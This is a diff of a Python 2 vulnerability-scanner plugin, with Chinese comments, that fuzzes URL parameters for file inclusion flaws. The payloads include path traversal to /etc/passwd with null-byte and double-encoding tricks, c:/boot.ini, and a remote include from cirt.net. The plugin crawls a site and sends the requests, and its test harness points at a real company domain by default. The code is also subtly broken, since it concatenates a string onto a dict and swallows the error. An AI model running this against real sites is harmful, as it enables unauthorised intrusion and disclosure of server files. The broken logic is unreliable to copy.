@@ -4,6 +4,7 @@
 import re
 import urlparse
 import urllib
+import requests
 import os
 from dummy import *
 
@@ -16,19 +17,16 @@ info = {
 # ----------------------------------------------------------------------------------------------------
 #
 # ----------------------------------------------------------------------------------------------------
-# 此函数会在爬虫扫描过程中调用，为任务派遣函数
-def assign(service, arg):
-	# 只接收链接
-	if service != "www": 
-		return
-	# 分析链接，看有没有查询参数
-	r = urlparse.urlparse(arg)
-	pairs = urlparse.parse_qsl(r.query)
-	# 如果参数过多，超过6个，效率起见，放弃此链接
-	if urlparse.urlparse(arg).query.find('=') == -1 or len(pairs) > 6:
-		return
-	# 返回True表始接收任务，arg是要调度器传给audit函数的参数
-	return True, arg
+# 获取所有链接
+def getCrawlerHrefs(url):
+	''' '''
+	try:
+		cf = CrawlerFile(url=url)
+		urls = cf.getSection('Hrefs')
+		return urls
+	except Exception,e:
+		print 'Exception:\t',e
+		return [url]
 
 # 远程文件包含的FUZZ函数
 def check_rfi(action, query, k, v, normal_res):
@@ -37,7 +35,9 @@ def check_rfi(action, query, k, v, normal_res):
 		# 网上总结的一组经典列表，以(路径，签名)做列表
 		paths = [
 				('../../../../../../../../../../etc/passwd', '/bin/(bash|sh)[^\r\n<>]*[\r\n]'),
+				('../../../../../../../../../../etc/passwd?', '/bin/(bash|sh)[^\r\n<>]*[\r\n]'),
 				('../../../../../../../../../../etc/passwd%00', '/bin/(bash|sh)[^\r\n<>]*[\r\n]'),
+				('../../../../../../../../../../etc/passwd%2500', '/bin/(bash|sh)[^\r\n<>]*[\r\n]'),
 				('http://cirt.net/rfiinc.txt?', '<title>phpinfo'),
 				('c:/boot.ini', '\[boot loader\][^\r\n<>]*[\r\n]'),
 				]
@@ -53,19 +53,40 @@ def check_rfi(action, query, k, v, normal_res):
 				# 第二轮fuzz, 只提交要fuzz的参数，其它不提交
 				qsl.append((k, inj))
 
+			
+			# urlencode会顺带queto url string，干扰截断
+			# 截断能用urlencode吗？encode之后不就截断不了啦
 			# 经合成URL
 			qs = urllib.urlencode(qsl)
+			
+			qs = urllib.unquote(qs)
 			url = '%s?%s' % (action, qs)
-			# 发送请求
-			code, head, res, _, _ = curl.curl(url)
-			debug('[%03d] %s', code, url)
-			# 开始查询是否包含签名内容, 如<?php <%
-			# 如果指定的签名在fuzz过程中找到，而没有在正常的网页里找到，说明漏洞存在
-			if re.search(fingerprint, res) and (not re.search(fingerprint, normal_res)):
-				# 记录一个报告
-				security_warning(url)
-				# 中断fuzz
-				return True
+			print 'url=\t',url
+			# # 发送请求
+			# code, head, res, _, _ = curl.curl(url)
+			# debug('[%03d] %s', code, url)
+			# # 开始查询是否包含签名内容, 如<?php <%
+			# # 如果指定的签名在fuzz过程中找到，而没有在正常的网页里找到，说明漏洞存在
+			# if re.search(fingerprint, res) and (not re.search(fingerprint, normal_res)):
+			# 	# 记录一个报告
+			# 	security_warning(url)
+			# 	# 中断fuzz
+			# 	return True
+			# ----------------------------------------------------------------------------------
+			# modifiedy by yangbh
+			# 
+			try:
+				respone = requests.get(url)
+				res = respone.text
+				if re.search(fingerprint, res) and (not re.search(fingerprint, normal_res)):
+					# 记录一个报告
+					# security_warning(url)
+					# 中断fuzz
+					return url
+			except Exception,e:
+				print 'Exception:\t',e
+
+	return False
 
 # 本地文件包含的fuzz函数
 def check_lfi(action, query, k, v, files, suffix, flags):
@@ -96,85 +117,122 @@ def check_lfi(action, query, k, v, files, suffix, flags):
 			# 构造URL
 			qs = urllib.urlencode(qsl)
 			url = '%s?%s' % (action, qs)
+			print 'url=\t',url
 			# 这里加了一个过滤器，防止产生重复的URL
 			if url not in filter:
 				filter[url] = True
 				# 请求URL
-				code, head, res, _, new_url = curl.curl(url)
-				debug('[%03d] %s', code, url)
-				# 开始查询是否包含签名内容, 如<?php <%
-				for w in flags:
-					if re.search(w, res):
-						# 发现漏洞，上传报告，并返回
-						security_warning(url)
-						return True
+				# ----------------------------------------------------------------------------------
+				# modifiedy by yangbh
+				# 
+				# code, head, res, _, new_url = curl.curl(url)
+				# debug('[%03d] %s', code, url)
+				# # 开始查询是否包含签名内容, 如<?php <%
+				# for w in flags:
+				# 	if re.search(w, res):
+				# 		# 发现漏洞，上传报告，并返回
+				# 		security_warning(url)
+				# 		return True
 
-def audit(arg):
-	# arg为assign传过来的链接，为一个带参数查询的URL
-	url = arg
-	r = urlparse.urlparse(url)
-	# 取出?号前面的地址
-	action = urlparse.urlunsplit((r.scheme, r.netloc, r.path, '', ''))
-	# 取出参数的key
-	pairs = urlparse.parse_qsl(r.query)
-	# 以下参数，为.NET的内置参数，自动跳过，不判断
-	reject_key = ['__VIEWSTATE', 'IbtnEnter.x', 'IbtnEnter.y']
+				try:
+					respone = requests.get(url)
+					res = respone.text
+					for w in flags:
+						if re.search(w, res):
+							# 发现漏洞，上传报告，并返回
+							return url
+				except Exception,e:
+					print 'Exception:\t',e
 
-	# 请求action, 保存一个返回内容的快照到normal_res
-	code, head, normal_res, _, _ = curl.curl(action)
+	return False
 
-	# 尝试每个参数是否有远程文件包含漏洞
-	for k, v in pairs:
-		# 跳过指定的内置参数
-		if k in reject_key:
-			continue
-		# 如果发现参数有漏洞，返回
-		if check_rfi(action, pairs, k, v, normal_res):
-			return
+def Audit(services):
+	retinfo = {}
+	output = ''
+	if services.has_key('url'):
+		output += 'plugin run' + os.linesep
+		url = services['url']
+		hrefs = getCrawlerHrefs(url)
+		pprint(hrefs)
+		try:
+			# 尝试每个参数是否有远程文件包含漏洞
+			for eachhref in hrefs:
+				r = urlparse.urlparse(eachhref)
+				# 取出?号前面的地址
+				action = urlparse.urlunsplit((r.scheme, r.netloc, r.path, '', ''))
+				# 取出参数的key
+				pairs = urlparse.parse_qsl(r.query)
+				# 以下参数，为.NET的内置参数，自动跳过，不判断
+				reject_key = ['__VIEWSTATE', 'IbtnEnter.x', 'IbtnEnter.y']
 
-	# 尝试每个参数是否有本地文件包含读取漏洞, 以当前文件名做为包含文件，传递
-	# 获取当前URL的快照，搜索内容来获取有效的用来判断是否利用成功的签名，如:<?php, <%
-	code, head, res, _, _ = curl.curl(url)
-	flags = []
-	for w in ['<\?[\r\n\s=]', '<\?php[\r\n\s=]', '<%[\r\n\s@]']:
-		if not re.search(w, res):
-			flags.append(w)
-	# 没有找到可以使用的签名，返回
-	if not flags:
-		return
+				try:
+					normal_res = requests.get(action).text
+					# 尝试每个参数是否有远程文件包含漏洞
+					for k, v in pairs:
+						# 跳过指定的内置参数
+						if k in reject_key:
+							continue
+						# 如果发现参数有漏洞，返回
+						ret = check_rfi(action, pairs, k, v, normal_res)
+						if ret:
+							retinfo += ret + os.linesep
+							return (retinfo,output)
+				except Exception,e:
+					print 'Exception:\t',e
 
-	paths = ['.', '..', '../..', '../../..', '../../../..', '../../../../..']
-	files = []
-	# 获取URL的文件名
-	filename = r.path.split('/')[-1]
+				# 尝试每个参数是否有本地文件包含读取漏洞, 以当前文件名做为包含文件，传递
+				# 获取当前URL的快照，搜索内容来获取有效的用来判断是否利用成功的签名，如:<?php, <%
+			
+				res = requests.get(eachhref).text
+				# code, head, res, _, _ = curl.curl(url)
+			
+				flags = []
+				for w in ['<\?[\r\n\s=]', '<\?php[\r\n\s=]', '<%[\r\n\s@]']:
+					if not re.search(w, res):
+						flags.append(w)
+				# 没有找到可以使用的签名，返回
+				if not flags:
+					return (retinfo,output)
 
-	# 保存到要fuzz的文件列表里
-	files.append(filename)
+				paths = ['.', '..', '../..', '../../..', '../../../..', '../../../../..']
+				files = []
+				# 获取URL的文件名
+				filename = r.path.split('/')[-1]
 
-	# 保存一组递归目录列表，如./a.php, ../a.php, ../../a.php
-	for path in paths:
-		files.append(path + '/' + filename)
+				# 保存到要fuzz的文件列表里
+				files.append(filename)
 
-	# 保存一组递归的完整文件列表如, /../news/show.php, /../../news/show.php
-	for path in paths:
-		files.append(path + r.path)
+				# 保存一组递归目录列表，如./a.php, ../a.php, ../../a.php
+				for path in paths:
+					files.append(path + '/' + filename)
 
-	# 开始遍历参数进行fuzz
-	for k, v in pairs:
-		# 跳过内置的参数
-		if k in reject_key:
-			continue
-		# 如果参数值里面找到类似a.jpg这样文件名特征, 获取文件后缀到suffix里面去
-		suffix = ''
-		if v.find('.') != -1:
-			suffix = v.split('.')[-1]
-		# 开始fuzz本地文件包含漏洞
-		if check_lfi(action, pairs, k, v, set(files), suffix, flags):
-			return
+				# 保存一组递归的完整文件列表如, /../news/show.php, /../../news/show.php
+				for path in paths:
+					files.append(path + r.path)
 
+				# 开始遍历参数进行fuzz
+				for k, v in pairs:
+					# 跳过内置的参数
+					if k in reject_key:
+						continue
+					# 如果参数值里面找到类似a.jpg这样文件名特征, 获取文件后缀到suffix里面去
+					suffix = ''
+					if v.find('.') != -1:
+						suffix = v.split('.')[-1]
+					# 开始fuzz本地文件包含漏洞
+					if check_lfi(action, pairs, k, v, set(files), suffix, flags):
+						return (retinfo,output)
+		except Exception,e:
+			print 'Exception:\t',e
+	return (retinfo,output)
+# ----------------------------------------------------------------------------------------------------
+#
+# ----------------------------------------------------------------------------------------------------
 # 测试代码开始
 if __name__ == '__main__':
-	# 调入SDK模拟环境
-	from dummy import *
-	# 模拟调试器传入参数，测试审计函数
-	audit(assign('www', 'http://www.example.com/')[1])
+	url='http://www.hengtiansoft.com'
+	if len(sys.argv) ==  2:
+		url = sys.argv[1]
+	services = {'url':url}
+	pprint(Audit(services))
+	pprint(services)
